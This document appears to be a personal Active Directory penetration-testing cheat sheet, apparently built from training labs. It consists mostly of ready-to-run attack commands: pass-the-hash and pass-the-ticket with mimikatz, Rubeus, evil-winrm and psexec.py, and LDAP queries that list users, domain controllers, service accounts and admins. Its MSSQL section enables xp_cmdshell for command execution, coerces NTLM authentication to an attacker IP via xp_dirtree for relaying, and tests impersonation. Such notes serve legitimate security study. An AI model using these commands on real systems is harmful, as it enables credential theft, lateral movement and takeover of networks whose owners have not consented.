
# AUTH
## username + hash  
```bash
mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH 
evil-winrm -i <IP> -u <USERNAME> -H <NTLM_HASH>
psexec.py DOMAIN/USERNAME@TARGET -hashes <LM_HASH>:<NT_HASH>

Rubeus.exe asktgt /user:jking /aes256:<hash> /domain:DEV /opsec /nowrap
```

## username + password 
create a fake session for non-domain machines.
```cmd
runas /netonly /user:za.tryhackme.com\jenna.field cmd.exe
== 
rubeus createnetonly /program:cmd.exe /show:true /ticket:<file or base64> /domain:forest.lab /opsec 

Rubeus.exe asktgt /user:jking /password:<pass> /domain:DEV /opsec /nowrap
```


now any network auth will automaticlly use these session. Now you can run:
```powershell
mmc.exe # to run AD users and Groups for example
dir \\thmdc.za.tryhackme.com\SYSVOL # == smbclient 
net view \\thmdc.za.tryhackme.com
```

## TGT only
```bash
rubeus createnetonly /program:cmd.exe /ticket:<ticket>
rubeus.exe ptt /ticket:<base64 or file>
```

# Enum
## AD objects strucuture  
 
```powershell
# BASIC
([ADSI]"LDAP://192.168.1.100/CN=Users,DC=forest,DC=lab").psbase.children 
([ADSI]"LDAP://192.168.1.100/RootDSE").defaultNamingContext
```


- Templates
```powershell
# BASE 
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = "LDAP://192.168.1.100/DC=forest,DC=lab"
--- 

# USERS 
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | % { $_.Properties.samaccountname }

# enabled USERS (via UAC)
$searcher.Filter = "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$searcher.FindAll() | % { $_.Properties.samaccountname }

# COMPUTERS 
$searcher.Filter = "(objectClass=computer)"
$searcher.FindAll() | % { $_.Properties.dnshostname }

# DCs
$searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
$searcher.FindAll() | % { $_.Properties.dnshostname }

# GROUPS
$searcher.Filter = "(objectClass=group)"
$searcher.FindAll() | % { $_.Properties.samaccountname }

#Specific Group by Name 
$searcher.Filter = "(&(objectClass=group)(cn=Domain Admins))"
$searcher.FindAll() | % { $_.Properties.distinguishedname }

# Service Accounts 
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
$searcher.FindAll() | % { $_.Properties.samaccountname }

# GPOs
$searcher.Filter = "(objectClass=groupPolicyContainer)" $searcher.FindAll() | % { $_.Properties.displayname }
```

## Explore
### SMB 
find all SMB in the network 
```powerview 
Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
```

### MSSQL 
[hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#read-file-with-openrowset)
SQLRecon, PowerUpSQL, mssqlclient.py (impacket), bloodhound, HeidiSQL (GUI SQL client), sqlcmd (windows)
```powershell
# PowerUpSQL
Get-SQLInstanceDomain
Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433"
Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
```

```powershell
# BlodHound
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

#### Run Command
Invoke-SQLOSCmd will enable the `xp_cmdshell` automaticly 
```powershell
Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```
or manual 
```powershell
# SQLcmd or any client 
EXEC xp_cmdshell 'whoami';
# ⚠️ error becuase the xp_cmdshell disabled, you can enable it but you need to be high privilages.
sp_configure 'Show Advanced Options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

#### NTLM relay
the query `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` will do a NTLM auth with  10.10.17.231 so we can do a [[skove/notes/windows/70%/lateral Movement/lateral Movement#NTLM relaying]]

you can use the hash to make a sliver ticket and forge your groups to be sysadmin. 
#### impersonation
check 
```powershell
SQLRecon.exe /a:wintoken /h:dc19.forest.lab /port:1434 /m:impersonate
SQLRecon.exe /a:wintoken /h:dc19.forest.lab /port:1434 /i:FOREST\menna /m:query /c:"SELECT IS_SRVROLEMEMBER('sysadmin');"
```

#### enum 

```python
# all logged in users
SELECT name FROM sys.server_principals

```